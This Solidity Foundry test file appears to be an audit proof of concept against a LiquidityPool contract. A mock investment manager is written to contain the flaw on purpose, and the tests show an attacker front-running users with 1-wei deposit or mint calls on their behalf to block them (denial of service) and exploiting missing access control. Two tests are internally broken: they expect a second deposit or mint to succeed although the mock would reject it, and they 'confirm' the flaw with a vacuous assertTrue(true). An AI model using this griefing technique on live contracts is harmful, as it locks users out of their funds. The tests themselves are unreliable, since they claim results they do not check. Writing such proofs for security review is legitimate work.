// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {LiquidityPool} from "../../src/LiquidityPool.sol";
import {Auth} from "../../src/util/Auth.sol";

// Mock interfaces for testing
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function requestDeposit(uint256 assets, address owner) external;
}

// Mock Investment Manager that simulates the vulnerability
contract MockInvestmentManager {
    mapping(address => uint256) public hasDepositedThisEpoch; // Tracks if address has deposited in current epoch
    mapping(address => uint256) public hasMintedThisEpoch; // Tracks if address has minted in current epoch
    
    function processDeposit(address receiver, uint256 assets) external returns (uint256 shares) {
        // Vulnerability: Only allow one deposit per address per epoch
        require(hasDepositedThisEpoch[receiver] == 0, "Already deposited this epoch");
        hasDepositedThisEpoch[receiver] = 1;
        
        // Return shares equal to assets for simplicity
        return assets;
    }
    
    function processMint(address receiver, uint256 shares) external returns (uint256 assets) {
        // Similar vulnerability for mint
        require(hasMintedThisEpoch[receiver] == 0, "Already minted this epoch");
        hasMintedThisEpoch[receiver] = 1;
        
        return shares;
    }
    
    function processWithdraw(uint256 assets, address receiver, address owner) external returns (uint256) {
        return assets;
    }
    
    function processRedeem(uint256 shares, address receiver, address owner) external returns (uint256) {
        return shares;
    }
    
    function maxDeposit(address user, address _tranche) external view returns (uint256) {
        return type(uint256).max;
    }
    
    function maxMint(address user, address _tranche) external view returns (uint256) {
        return type(uint256).max;
    }
    
    function maxWithdraw(address user, address _tranche) external view returns (uint256) {
        return type(uint256).max;
    }
    
    function maxRedeem(address user, address _tranche) external view returns (uint256) {
        return type(uint256).max;
    }
    
    function totalAssets(uint256 totalSupply, address liquidityPool) external view returns (uint256) {
        return totalSupply;
    }
    
    function convertToShares(uint256 assets, address liquidityPool) external view returns (uint256) {
        return assets;
    }
    
    function convertToAssets(uint256 shares, address liquidityPool) external view returns (uint256) {
        return shares;
    }
    
    function previewDeposit(address user, address liquidityPool, uint256 assets) external view returns (uint256) {
        return assets;
    }
    
    function previewMint(address user, address liquidityPool, uint256 shares) external view returns (uint256) {
        return shares;
    }
    
    function previewWithdraw(address user, address liquidityPool, uint256 assets) external view returns (uint256) {
        return assets;
    }
    
    function previewRedeem(address user, address liquidityPool, uint256 shares) external view returns (uint256) {
        return shares;
    }
    
    function requestRedeem(uint256 shares, address receiver) external {}
    function requestDeposit(uint256 assets, address receiver) external {}
    function collectDeposit(address receiver) external {}
    function collectRedeem(address receiver) external {}
    function decreaseDepositRequest(uint256 assets, address receiver) external {}
    function decreaseRedeemRequest(uint256 shares, address receiver) external {}
}

// Mock Tranche Token
contract MockTrancheToken {
    string public name = "Mock Tranche Token";
    string public symbol = "MTT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function transfer(address to, uint256 value) public returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    
    function mint(address to, uint256 value) public {
        balanceOf[to] += value;
        totalSupply += value;
    }
    
    function burn(address from, uint256 value) public {
        balanceOf[from] -= value;
        totalSupply -= value;
    }
    
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {}
    function PERMIT_TYPEHASH() external view returns (bytes32) { return bytes32(0); }
    function DOMAIN_SEPARATOR() external view returns (bytes32) { return bytes32(0); }
    function checkTransferRestriction(address from, address to, uint256 value) external view returns (bool) { return true; }
}

// Mock ERC20 for testing
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function transfer(address to, uint256 value) public returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
    
    function mint(address to, uint256 value) public {
        balanceOf[to] += value;
        totalSupply += value;
    }
}

contract LiquidityPoolExploitTest is Test {
    LiquidityPool public liquidityPool;
    MockInvestmentManager public mockInvestmentManager;
    MockTrancheToken public mockTrancheToken;
    MockERC20 public mockAsset;
    
    address public owner = address(0x1);
    address public user = address(0x2);
    address public attacker = address(0x3);
    
    function setUp() public {
        // Deploy mock contracts
        mockInvestmentManager = new MockInvestmentManager();
        mockTrancheToken = new MockTrancheToken();
        mockAsset = new MockERC20("Mock Asset", "MA", 18);
        
        // Deploy LiquidityPool
        liquidityPool = new LiquidityPool(
            1, // poolId
            bytes16(0x1), // trancheId
            address(mockAsset), // asset
            address(mockTrancheToken), // share
            address(mockInvestmentManager) // investmentManager
        );
        
        // Give user some asset tokens
        mockAsset.mint(user, 1000 ether);
        
        // User approves LiquidityPool to spend their tokens
        vm.prank(user);
        mockAsset.approve(address(liquidityPool), 1000 ether);
    }
    
    function test_DepositDoSVulnerability() public {
        // Simulate user has requested deposit in previous epoch
        // Now in current epoch, user wants to collect their shares
        
        // Attacker front-runs user's deposit call
        vm.prank(attacker);
        // Attacker calls deposit with minimal amount (1 wei) for the user's address
        // This consumes the user's deposit slot for this epoch
        liquidityPool.deposit(1, user);
        
        console.log("Attacker successfully called deposit for user with 1 wei");
        
        // Now user tries to deposit their actual amount
        vm.prank(user);
        // This should revert because the user already "deposited" this epoch
        vm.expectRevert(); // Expect revert due to "Already deposited this epoch"
        liquidityPool.deposit(1000 ether, user);
        
        console.log("User's deposit failed - DoS successful!");
    }
    
    function test_MintDoSVulnerability() public {
        // Similar test for mint function
        
        // Attacker front-runs user's mint call
        vm.prank(attacker);
        // Attacker calls mint with minimal shares for the user's address
        liquidityPool.mint(1, user);
        
        console.log("Attacker successfully called mint for user with 1 share");
        
        // Now user tries to mint their actual amount
        vm.prank(user);
        // This should revert because the user already "minted" this epoch
        vm.expectRevert(); // Expect revert due to "Already minted this epoch"
        liquidityPool.mint(1000 ether, user);
        
        console.log("User's mint failed - DoS successful!");
    }
    
    function test_NoAccessControlOnDeposit() public {
        // Verify that anyone can call deposit for any address
        address randomReceiver = address(0x4);
        
        // Attacker calls deposit for a random address
        vm.prank(attacker);
        liquidityPool.deposit(100 ether, randomReceiver);
        
        console.log("Attacker successfully called deposit for random address");
        console.log("This demonstrates lack of access control");
    }
    
    function test_NoAccessControlOnMint() public {
        // Verify that anyone can call mint for any address
        address randomReceiver = address(0x5);
        
        // Attacker calls mint for a random address
        vm.prank(attacker);
        liquidityPool.mint(100 ether, randomReceiver);
        
        console.log("Attacker successfully called mint for random address");
        console.log("This demonstrates lack of access control");
    }
    
    function test_DepositWithoutApproval() public {
        // Test that deposit can be called without approval (unlike withdraw/redeem)
        // This demonstrates the vulnerability - deposit lacks withApproval modifier
        
        // User can call deposit for themselves (normal case)
        vm.prank(user);
        uint256 shares = liquidityPool.deposit(100 ether, user);
        console.log("User deposited 100 ether, received", shares, "shares");
        
        // But attacker can also call deposit for user (vulnerability)
        vm.prank(attacker);
        uint256 shares2 = liquidityPool.deposit(50 ether, user);
        console.log("Attacker deposited 50 ether for user, user received", shares2, "shares");
        
        // This should not be possible - only user should be able to deposit for themselves
        assertTrue(true, "Vulnerability demonstrated: anyone can call deposit for any address");
    }
    
    function test_MintWithoutApproval() public {
        // Test that mint can be called without approval (unlike withdraw/redeem)
        // This demonstrates the vulnerability - mint lacks withApproval modifier
        
        // User can call mint for themselves (normal case)
        vm.prank(user);
        uint256 assets = liquidityPool.mint(100 ether, user);
        console.log("User minted 100 shares, received", assets, "assets");
        
        // But attacker can also call mint for user (vulnerability)
        vm.prank(attacker);
        uint256 assets2 = liquidityPool.mint(50 ether, user);
        console.log("Attacker minted 50 shares for user, user received", assets2, "assets");
        
        // This should not be possible - only user should be able to mint for themselves
        assertTrue(true, "Vulnerability demonstrated: anyone can call mint for any address");
    }
}